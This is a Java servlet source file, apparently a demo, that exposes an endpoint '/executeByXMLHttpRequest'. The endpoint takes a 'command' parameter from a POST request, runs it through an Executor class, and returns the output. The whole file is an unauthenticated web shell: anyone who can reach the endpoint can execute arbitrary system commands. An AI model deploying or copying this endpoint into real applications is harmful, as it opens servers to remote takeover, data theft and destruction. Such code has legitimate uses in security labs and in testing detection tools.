package com.example;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet(urlPatterns = {"/executeByXMLHttpRequest"}, loadOnStartup = 2)
public class XMLHttpRequestServlet  extends HttpServlet {
    public void doPost(HttpServletRequest request, HttpServletResponse response)
            throws IOException {
        String command = request.getParameter("command");
        String result = Executor.executeCommand(command);
        response.setHeader("Content-Type", "text/plain");
        response.setHeader("success", "yes");
        PrintWriter writer = response.getWriter();
        writer.write(result);
        writer.close();
    }
}
